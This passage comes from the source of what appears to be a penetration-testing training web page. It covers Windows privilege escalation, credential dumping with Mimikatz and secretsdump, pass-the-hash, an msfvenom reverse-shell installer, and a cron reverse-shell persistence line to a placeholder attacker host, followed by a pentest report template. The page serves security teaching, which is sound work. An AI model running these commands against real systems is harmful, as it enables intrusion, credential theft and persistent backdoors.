reg query HKLM /f password /t REG_SZ /s  # search registry for passwords

# STEP 2: UNQUOTED SERVICE PATHS
# If a service path has spaces and no quotes:
# C:\Program Files\My Service\service.exe
# Windows tries:
# C:\Program.exe → C:\Program Files\My.exe → C:\Program Files\My Service\service.exe
# If you can write to C:\Program Files\ → plant "My.exe" → runs as SYSTEM on restart
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# STEP 3: WEAK SERVICE PERMISSIONS
# If you can modify a service's binary path:
sc qc ServiceName   # view service config
accesschk.exe -uwcqv "Authenticated Users" *   # find weak permissions
sc config ServiceName binpath= "cmd.exe /c net localgroup administrators user /add"
net stop ServiceName && net start ServiceName

# STEP 4: TOKEN IMPERSONATION (if SeImpersonatePrivilege)
whoami /priv   # check for SeImpersonatePrivilege
# If present → use PrintSpoofer or RoguePotato:
PrintSpoofer.exe -i -c cmd   # instant SYSTEM shell

# STEP 5: ALWAYS INSTALL ELEVATED
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: any .msi installs as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi   # execute as SYSTEM

# AUTOMATION:
# WinPEAS — comprehensive Windows privesc checker
# Download: github.com/carlospolop/PEASS-ng/releases
winpeas.exe

# PowerUp:
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"`}</Pre>

      {/* 11 */}
      <H2>11 — Post-Exploitation & Persistence</H2>
      <Pre label="// POST-EXPLOITATION OBJECTIVES">{`# Once you have high-privilege access, demonstrate impact:

# 1. CREDENTIAL HARVESTING
# Linux — dump /etc/shadow:
cat /etc/shadow   # needs root
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=rockyou.txt

# Windows — dump SAM database:
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Offline: use secretsdump.py from impacket
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL

# Mimikatz (Windows — dumps plaintext passwords from memory):
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords    # dumps all logged-in user credentials
lsadump::sam                # dump SAM
sekurlsa::pth /user:admin /domain:. /ntlm:HASH /run:cmd.exe  # pass-the-hash

# 2. LATERAL MOVEMENT
# Pass-the-Hash (Windows — use NTLM hash without cracking):
python3 psexec.py -hashes :NTLM_HASH administrator@192.168.1.100

# Pass-the-Ticket (Kerberos):
python3 getTGT.py domain.local/user:password
export KRB5CCNAME=user.ccache
python3 psexec.py -k domain.local/user@server.domain.local

# 3. DATA EXFILTRATION (proof of access — simulated)
# Find sensitive files:
find / -name "*.kdbx" 2>/dev/null   # KeePass databases
find / -name "id_rsa" 2>/dev/null   # SSH private keys
find / -name "*.pem" 2>/dev/null    # certificates
grep -r "password" /var/www/ 2>/dev/null  # passwords in web files

# 4. PERSISTENCE (document + remove during cleanup)
# Linux:
echo "* * * * * bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /var/spool/cron/root
# Add SSH key to authorized_keys

# Windows:
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\payload.exe"

# IMPORTANT: All persistence mechanisms must be documented and removed at end of engagement`}</Pre>

      {/* 12 */}
      <H2>12 — Reporting: Writing Professional Pentest Reports</H2>
      <P>The report is the deliverable. A technically perfect engagement with a poorly written report is worthless to the client. The report must clearly communicate what was found, what the risk is, and exactly how to fix it — to both technical and non-technical readers.</P>

      <Pre label="// REPORT STRUCTURE">{`# PROFESSIONAL PENTEST REPORT TEMPLATE

# ─────────────────────────────────────
# SECTION 1: COVER PAGE
# ─────────────────────────────────────
  Client name, engagement dates, report date
  Classification: CONFIDENTIAL
  Prepared by: [your name / company]
  Version: 1.0

# ─────────────────────────────────────
# SECTION 2: EXECUTIVE SUMMARY (1-2 pages)
# ─────────────────────────────────────
  Written for: C-suite, non-technical readers
  Content:
  - Engagement overview (what was tested, when)
  - Overall risk rating (Critical / High / Medium / Low)
  - Top 3-5 most critical findings in plain English
  - Business impact (what could a real attacker do?)
  - Positive findings (what's working well)
  - Key recommendation priorities

# ─────────────────────────────────────
# SECTION 3: SCOPE & METHODOLOGY
# ─────────────────────────────────────
  In-scope assets (IPs, domains, applications)
  Out-of-scope assets
  Testing dates and times
  Testing methodology (PTES, OWASP, NIST)
  Tools used
  Limitations (short timeline, limited credentials)

# ─────────────────────────────────────
# SECTION 4: FINDINGS (one page per finding)
# ─────────────────────────────────────
  Per finding:
  Title: Clear, descriptive (not "SQLi" — "SQL Injection in Login Form Allows Database Compromise")
  Severity: Critical / High / Medium / Low / Informational
  CVSS Score: 0.0 - 10.0 (use calculator: nvd.nist.gov/vuln-metrics/cvss)
  Affected Asset: specific URL, IP, service
  
  Description:
    What is the vulnerability? (technical explanation)
    
  Evidence:
    Screenshots, request/response pairs, tool output
    
  Impact:
    What can an attacker specifically do?
    What data is at risk? What systems?
    
  Proof of Concept:
    Exact steps to reproduce (including tool commands)
    
  Recommendation:
    Specific, actionable fix
    Code example of the fix if applicable
    Reference: CVE number, OWASP link, vendor advisory

# ─────────────────────────────────────
# SECTION 5: RISK RATINGS EXPLAINED
# ─────────────────────────────────────
  Critical: RCE, authentication bypass, data breach possible
  High:     Significant data exposure, privilege escalation
  Medium:   Limited impact, requires user interaction
  Low:      Minimal impact, defence-in-depth issue
  Info:     Best practice, not a direct vulnerability

# ─────────────────────────────────────
# SECTION 6: APPENDICES
# ─────────────────────────────────────
  A: Vulnerability Summary Table (all findings, one row each)
  B: Scope confirmation (signed authorisation)
  C: Tool versions used
  D: Raw scan output (Nmap, Nessus)`}</Pre>

      <Alert type="tip">The best pentest reports are ones the client can hand directly to their development team to fix every issue without follow-up questions. Every finding needs: exact reproduction steps, exact fix recommendation, and evidence screenshot. Vague findings = unprofessional report = no repeat business.</Alert>

      {/* Footer */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2e1e' }}>
        <div style={{ background: 'rgba(191,95,255,0.04)', border: '1px solid rgba(191,95,255,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#3a1a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', color: '#bf5fff', marginBottom: '0.5rem', fontWeight: 600 }}>MOD-04 Interactive Lab</div>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a', marginBottom: '1.5rem' }}>5 steps &middot; 130 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/offensive/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem', color: '#bf5fff', padding: '12px 32px', border: '1px solid rgba(191,95,255,0.6)', borderRadius: '6px', background: 'rgba(191,95,255,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(191,95,255,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/crypto" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>&#8592; MOD-03: CRYPTO</Link>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a6a3a' }}>MOD-05: ACTIVE DIRECTORY &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
